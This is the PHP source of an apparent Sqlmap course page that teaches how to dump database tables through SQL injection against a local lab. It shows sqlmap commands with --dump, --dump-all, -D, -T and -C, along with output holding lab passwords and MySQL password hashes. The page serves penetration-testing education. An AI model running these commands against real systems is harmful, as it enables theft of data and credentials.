<?php
    require_once 'relative_init.php';
    include_once SHARED_PATH . 'course_header.php';

     // Title and description are set in page_header.php
    $title = "Steal database table data";
    $description = "Learn how to bypass web application firewalls with Sqlmap.";
    include_once SHARED_PATH . 'page_header.php';

    // Legal disclaimer and terminal animations
    $terminal_text = 'sudo apt-get install -y python3';
    include SHARED_PATH . 'terminal_text.php';
    include_once SHARED_PATH . 'legal_disclaimer.php';
    $terminal_text = 'python3 --version';
    include SHARED_PATH . 'terminal_text.php';

    // Tutorial navigation buttons
    $previous = 'get-database-structure-information.php';
    $home = 'sqlmap-course-home.php#tutorials';
    $next = 'steal-database-table-data.php';
    include SHARED_PATH . 'tutorial_navigation.php';

    // Table of contents
    include SHARED_PATH . 'table_of_contents.php';
?>

    <div class="course-top-level-container">
      <h1 class="title toc">Steal database information</h1>
      <p>
        Stealing information from databases is the main reason that people try
        to exploit them with tools like Sqlmap. In this tutorial we will look at
        how to steal information from tables in relational databases. The following
        Sqlmap arguments will be covered.
      </p>

<pre class="lang-bash default-code-style dark-mode-background">
    --dump              Dump DBMS database table entries
    --dump-all          Dump all DBMS databases tables entries
    -D DB               DBMS database to enumerate
    -T TBL              DBMS database table(s) to enumerate
    -C COL              DBMS database table column(s) to enumerate</pre>

      <h1 class="title toc">Dump the table entries of the current database</h1>
      <p>
        The first argument in the list will dump all table entries of the database
        that is being used by the vulnerable application. If you want all data from
        all databases on the userver, use <span class="inline-code">
        &ndash;&ndash;dump&ndash;all</span>.
      </p>

<pre class="lang-bash default-code-style dark-mode-background">
python3 sqlmap.py -u http://127.0.0.1/ <mark>--dump</mark> --random-agent --forms --batch

Database: sql_injection_labs
<mark>Table: product</mark>
[13 entries]
+---------+--------+
| name    | price  |
+---------+--------+
| Cup     | 1.50   |
| Plate   | 1.50   |
| Fork    | 1.50   |
| Knife   | 1.50   |
| Spoon   | 1.50   |
| Bowl    | 1.50   |
| Hat     | 3.00   |
| Desk    | 150.00 |
| Paper   | 15.00  |
| Chair   | 125.00 |
| Lamp    | 20.00  |
| Book    | 8.00   |
| Sticker | 0.50   |
+---------+--------+

[19:39:19] [INFO] table 'sql_injection_labs.product' dumped to CSV file 'C:\Users\Owner\AppData\Local\sqlmap\output\192.168.1.75\dump\sql_injection_labs\product.csv'
[19:39:19] [INFO] fetching columns for table 'user' in database 'sql_injection_labs'
[19:39:19] [INFO] fetching entries for table 'user' in database 'sql_injection_labs'
Database: sql_injection_labs
<mark>Table: user</mark>
[3 entries]
+------------------+---------------+
| password         | username      |
+------------------+---------------+
| P@$$w0rd         | david         |
| hackMe!          | lindsey       |
| SecurePassword:) | administrator |
+------------------+---------------+</pre>

      <p>
        Two tables exist in the databases <span class="inline-code">sql_injection_labs
        </span> which is the database that is being used by the vulnerable application.
        The command dumped all of the table data of the <span class="inline-code">product</span>
        and <span class="inline-code">user</span> tables.
      </p>
      
      <h1 class="title toc">Dump the table entries of all databases</h1>
      <p>
        Often it is desierable to obtain as much information as possible, if this
        is the case then you may want to dump the table entries for all databases
        running on the server. To do this, we simply change the <span class="inline-code">
        &ndash;&ndash;dump</span> flag to <span class="inline-code">&ndash;&ndash;dump&ndash;all</span>.
      </p>

<pre class="lang-bash default-code-style dark-mode-background">
python3 sqlmap.py -u http://127.0.0.1/ <mark>--dump-all</mark> --random-agent --forms --batch
</pre>
      
      <p>
        This command will output thousands of lines to the console, so we ommit them here.
        The output is similar to the output from the previous section, but all
        tables from all databases are included.
      </p>
      
      <h1 class="title toc">Targeting databases, tables, and columns</h1>
      <p>
        Sqlmap adds flags for specifically targeting databases, tables, and columns.
        For example, suppose the application we are exploiting is running MariaDB.
        Let's also suppose that you are looing to for configuration data pertaining
        to the database server. To find tables about the DBMS itself on a MariaDB,
        we would look in the <span class="inline-code">mysql</span> database.
      </p>
      <p>
        To specify the database to enumerate, we use the <span class="inline-code">
        &nbsp;D &lt;database name&gt;</span> command line parameter.
        To enumerate all tables of the <span class="inline-code">mysql</span> database,
        we would use the command line arguments <span class="inline-code">&nbsp;D mysql &nbsp;&nbsp;tables</span>.
      </p>

<pre class="lang-bash default-code-style dark-mode-background">
python3 sqlmap.py -u http://127.0.0.1/ <mark>-D mysql --tables</mark> --random-agent --forms --batch

Database: mysql
[31 tables]
+---------------------------+
| user                      |
| column_stats              |
| columns_priv              |
| db                        |
| event                     |
| func                      |
| general_log               |
| gtid_slave_pos            |
| help_category             |
| help_keyword              |
| help_relation             |
| help_topic                |
| host                      |
| index_stats               |
| innodb_index_stats        |
| innodb_table_stats        |
| plugin                    |
| proc                      |
| procs_priv                |
| proxies_priv              |
| roles_mapping             |
| servers                   |
| slow_log                  |
| table_stats               |
| tables_priv               |
| time_zone                 |
| time_zone_leap_second     |
| time_zone_name            |
| time_zone_transition      |
| time_zone_transition_type |
| transaction_registry      |
+---------------------------+</pre>

      <p>
        The output lists all tables that belong to the mysql database. If we want
        to view the contents of a specific table, we can remove the <span class="inline-code">
        &nbsp;&nbsp;tables</span> from the previous command and add the arguments
        <span class="inline-code">&nbsp;T &lt;table name&gt; &nbsp;&nbsp;dump</span>.
      </p>
      <p>
        For instance, suppose we wanted to get all data from the table <span class="inline-code">
        mysql.user</span>. We can do so with the below command.
      </p>

<pre class="lang-bash default-code-style dark-mode-background">
python3 sqlmap.py -u http://127.0.0.1/ <mark>-D mysql -T user --dump</mark> --random-agent --forms --batch


Database: mysql
Table: user
[6 entries]
+-----------+------------+-------------+---------+-------------------------------------------+----------+-----------+-----------+------------+------------+------------+------------+------------+------------+-------------+-------------+-------------+-------------+-------------+-------------+-------------+-------------+--------------+--------------+--------------+--------------+--------------+--------------+---------------+---------------+----------------+-----------------+-----------------+-----------------+------------------+------------------+------------------+------------------+------------------+--------------------+--------------------+---------------------+---------------------+----------------------+-----------------------+-----------------------+------------------------+
| Host      | User       | plugin      | is_role | Password                                  | ssl_type | Drop_priv | File_priv | Alter_priv | Event_priv | Grant_priv | Index_priv | Super_priv | ssl_cipher | Create_priv | Delete_priv | Insert_priv | Reload_priv | Select_priv | Update_priv | max_updates | x509_issuer | Execute_priv | Process_priv | Show_db_priv | Trigger_priv | default_role | x509_subject | Shutdown_priv | max_questions | Show_view_priv | References_priv | Repl_slave_priv | max_connections | Create_user_priv | Create_view_priv | Lock_tables_priv | Repl_client_priv | password_expired | Alter_routine_priv | max_statement_time | Create_routine_priv | Delete_history_priv | max_user_connections | Create_tmp_table_priv | authentication_string | Create_tablespace_priv |
+-----------+------------+-------------+---------+-------------------------------------------+----------+-----------+-----------+------------+------------+------------+------------+------------+------------+-------------+-------------+-------------+-------------+-------------+-------------+-------------+-------------+--------------+--------------+--------------+--------------+--------------+--------------+---------------+---------------+----------------+-----------------+-----------------+-----------------+------------------+------------------+------------------+------------------+------------------+--------------------+--------------------+---------------------+---------------------+----------------------+-----------------------+-----------------------+------------------------+
| localhost | root       | unix_socket | N       | <blank>                                   | <blank>  | Y         | Y         | Y          | Y          | Y          | Y          | Y          | <blank>    | Y           | Y           | Y           | Y           | Y           | Y           | 0           | <blank>     | Y            | Y            | Y            | Y            | <blank>      | <blank>      | Y             | 0             | Y              | Y               | Y               | 0               | Y                | Y                | Y                | Y                | N                | Y                  | 0.000000           | Y                   | Y                   | 0                    | Y                     | <blank>               | Y                      |
| %         | math       | <blank>     | N       | *55983CD002F6CA93CC70FF80761396D215DC1C93 | <blank>  | N         | N         | N          | N          | N          | N          | N          | <blank>    | N           | N           | N           | N           | N           | N           | 0           | <blank>     | N            | N            | N            | N            | <blank>      | <blank>      | N             | 0             | N              | N               | N               | 0               | N                | N                | N                | N                | N                | N                  | 0.000000           | N                   | N                   | 0                    | N                     | <blank>               | N                      |
| %         | template   | <blank>     | N       | *0960709678F1BA0A91343F65D12918A522E814DE | <blank>  | N         | N         | N          | N          | N          | N          | N          | <blank>    | N           | N           | N           | N           | N           | N           | 0           | <blank>     | N            | N            | N            | N            | <blank>      | <blank>      | N             | 0             | N              | N               | N               | 0               | N                | N                | N                | N                | N                | N                  | 0.000000           | N                   | N                   | 0                    | N                     | <blank>               | N                      |
| localhost | sammy      | <blank>     | N       | *2470C0C06DEE42FD1618BB99005ADCA2EC9D1E19 | <blank>  | N         | N         | N          | N          | N          | N          | N          | <blank>    | N           | N           | N           | N           | N           | N           | 0           | <blank>     | N            | N            | N            | N            | <blank>      | <blank>      | N             | 0             | N              | N               | N               | 0               | N                | N                | N                | N                | N                | N                  | 0.000000           | N                   | N                   | 0                    | N                     | <blank>               | N                      |
| localhost | sql_inject | <blank>     | N       | *83D5F42526EF6E226CFAD4FE875D017ADF14357C | <blank>  | Y         | N         | Y          | N          | Y          | N          | N          | <blank>    | Y           | Y           | Y           | Y           | Y           | Y           | 0           | <blank>     | N            | N            | N            | N            | <blank>      | <blank>      | N             | 0             | N              | Y               | N               | 0               | N                | N                | N                | N                | N                | N                  | 0.000000           | N                   | N                   | 0                    | N                     | <blank>               | N                      |
| localhost | nimda      | <blank>     | N       | *968BF9E2F4853B0FD9C5AFC2D2D29050DDD62D8C | <blank>  | Y         | N         | Y          | N          | Y          | N          | N          | <blank>    | Y           | Y           | Y           | Y           | Y           | Y           | 0           | <blank>     | N            | N            | N            | N            | <blank>      | <blank>      | N             | 0             | N              | Y               | N               | 0               | N                | N                | N                | N                | N                | N                  | 0.000000           | N                   | N                   | 0                    | N                     | <blank>               | N                      |
+-----------+------------+-------------+---------+-------------------------------------------+----------+-----------+-----------+------------+------------+------------+------------+------------+------------+-------------+-------------+-------------+-------------+-------------+-------------+-------------+-------------+--------------+--------------+--------------+--------------+--------------+--------------+---------------+---------------+----------------+-----------------+-----------------+-----------------+------------------+------------------+------------------+------------------+------------------+--------------------+--------------------+---------------------+---------------------+----------------------+-----------------------+-----------------------+------------------------+</pre>

      <p>
        As we can see, there are a ton of table columns in the mysql.user table.
        But suppose we only want the <span class="inline-code">User</span>, 
        <span class="inline-code">Host</span>, and <span class="inline-code">Password</span>
        columns. We can target these columns with the arguments <span class="inline-code">
        -D mysql -T user -C Host,User,Password --dump</span>. Notice that there are commas
        between the column names in the command with no whitespace. The lack of
        whitespace is important so that Sqlmap can properly parse the arguments.
      </p>

<pre class="lang-bash default-code-style dark-mode-background">
python3 sqlmap.py -u http://127.0.0.1/ <mark>-D mysql -T user -C Host,User,Password --dump</mark> --random-agent --forms --batch

Database: mysql
Table: user
[6 entries]
+-----------+------------+-------------------------------------------+
| Host      | User       | Password                                  |
+-----------+------------+-------------------------------------------+
| localhost | root       | <blank>                                   |
| %         | math       | *55983CD002F6CA93CC70FF80761396D215DC1C93 |
| %         | template   | *0960709678F1BA0A91343F65D12918A522E814DE |
| localhost | sammy      | *2470C0C06DEE42FD1618BB99005ADCA2EC9D1E19 |
| localhost | sql_inject | *83D5F42526EF6E226CFAD4FE875D017ADF14357C |
| localhost | nimda      | *968BF9E2F4853B0FD9C5AFC2D2D29050DDD62D8C |
+-----------+------------+-------------------------------------------+</pre>

      <p>
        In the console we see that only the columns that we specified are displayed.
      </p>

    </div>

    <?php include SHARED_PATH . 'tutorial_navigation.php'; ?>
    <div class="course-top-level-container">
    <?php
        $tags = array(
            'Sqlmap',
            'Python3',
            'Debian Linux',
            'Bash'
        );
        
        generate_technology_tags($tags);
    ?>
    </div>

<?php require_once SHARED_PATH . 'page_footer.php'; ?>